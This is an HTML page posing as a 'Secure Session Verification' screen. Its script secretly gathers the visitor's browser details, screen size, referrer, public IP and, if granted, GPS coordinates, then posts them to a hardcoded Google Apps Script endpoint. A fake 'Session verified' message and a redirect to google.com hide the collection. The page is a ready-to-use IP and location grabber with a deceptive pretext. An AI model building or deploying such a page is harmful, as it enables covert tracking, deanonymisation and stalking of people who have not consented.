<!DOCTYPE html>
<html>
<head>
  <title>Secure Session Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h3>Please wait while we verify your session...</h3>

  <script>
    const data = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: screen.width,
      screenHeight: screen.height,
      referrer: document.referrer
    };

    // Step 1: Get public IP
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        data.ip = ipData.ip;

        // Step 2: Get location
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            data.latitude = pos.coords.latitude;
            data.longitude = pos.coords.longitude;
            data.accuracy = pos.coords.accuracy;
            sendData();
          },
          function (err) {
            data.latitude = "";
            data.longitude = "";
            data.accuracy = "";
            sendData(); // Still send without location
          }
        );
      });

    // Step 3: Send data to Google Apps Script
    function sendData() {
      const formData = new URLSearchParams();
      for (let key in data) {
        formData.append(key, data[key]);
      }

      fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
        method: "POST",
        body: formData
        // ❌ Don't use mode: "no-cors"
      });

      document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);
    }
  </script>
</body>
</html>
